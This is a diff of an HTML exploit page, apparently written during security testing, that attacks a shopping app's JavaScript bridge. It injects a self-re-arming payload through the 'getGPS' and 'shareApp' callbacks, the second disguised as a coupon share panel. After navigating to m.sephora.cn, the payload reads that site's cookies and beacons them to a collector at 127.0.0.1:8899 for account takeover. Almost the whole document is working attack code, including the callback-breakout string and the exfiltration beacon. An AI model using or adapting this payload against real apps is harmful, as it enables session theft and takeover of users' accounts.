@@ -1,10 +1,9 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATO-T</title></head>
+<title>ATO-v2</title></head>
 <body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
-<h3 style="color:#c9a96e">ATO Test v1 (GPS race)</h3>
+<h3 style="color:#c9a96e">ATO v2 (sweeper + shareApp)</h3>
 <div id="log"></div>
 <script>
-// 防御性定义: 注入前缀 sep._onSuccess(0) 不炸
 window.sep = {};
 sep._onSuccess = function(){};
 sep._onFailure = function(){};
@@ -16,31 +15,36 @@ function beacon(tag, extra){
     '&d=' + encodeURIComponent(extra || '').substring(0, 600);
 }
 
+// ★ 扫雷载荷: 落在哪个页面就检查哪个页面; sephora.cn 源 → WIN; 否则重新arm继续扫
+window.__p = "0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));document.title='ATO-WIN-'+c.length;return;}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=sweep'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<40){try{appHandler.appMonitorScript('getGPS',window.__p,'{}');}catch(e){}}})();//";
+
 beacon('page-load', location.href);
-L('page loaded: ' + location.href);
+L('page: ' + location.href);
 
 if (typeof appHandler === 'undefined') {
-  L('NO bridge — not in app');
-  beacon('no-bridge', '');
+  L('NO bridge'); beacon('no-bridge','');
 } else {
-  L('bridge OK, arming GPS callback...');
-  beacon('bridge-ok', navigator.userAgent.substring(0, 90));
+  L('bridge OK');
+  beacon('bridge-ok', navigator.userAgent.substring(0, 80));
 
-  // 阶段2载荷: 回调落在哪个页面, 就读那个页面的 origin + cookie 并 beacon 出来
-  var pay = "0);var c=document.cookie;new Image().src='http://127.0.0.1:8899/x?t=stage2&d='+encodeURIComponent(location.origin+' ||| '+c.substring(0,500));document.title='ATO:'+c.length;//";
-  appHandler.appMonitorScript('getGPS', pay, '{}');
-  L('GPS armed (t=0)');
+  // 载体1: GPS 扫雷 (持续arm, 页面切换后命中)
+  appHandler.appMonitorScript('getGPS', window.__p, '{}');
+  L('sweeper armed');
 
-  // 心跳: 每秒报告页面还活着
+  // 载体2: shareApp (面板弹出后任意交互 → onCancel/onResult sink)
+  appHandler.appMonitorScript('shareApp', window.__p,
+    '{"title":"\u9886\u53d6\u4f18\u60e0\u5238","content":"\u9650\u65f6\u798f\u5229","shareUrl":"https://m.sephora.cn/"}');
+  L('shareApp armed (\u82e5\u5f39\u51fa\u9762\u677f, \u7a0d\u540e\u70b9\u53d6\u6d88)');
+
+  // 心跳
   var hb = 0;
-  var hbt = setInterval(function(){ beacon('hb', '' + (++hb)); }, 1000);
+  setInterval(function(){ beacon('hb',''+(++hb)); }, 1500);
 
-  // t=2s: 导航到丝芙兰自家域 (观察: 原地 or 新Activity — frida 会记录)
+  // t=3s: 导航 (页面加载需要 1-3s, 扫雷器持续覆盖)
   setTimeout(function() {
-    clearInterval(hbt);
-    L('navigating to m.sephora.cn ...');
-    beacon('nav-start', '');
+    L('nav -> m.sephora.cn');
+    beacon('nav-start','');
     location.href = 'https://m.sephora.cn/beauty-community';
-  }, 2000);
+  }, 3000);
 }
 </script></body></html>
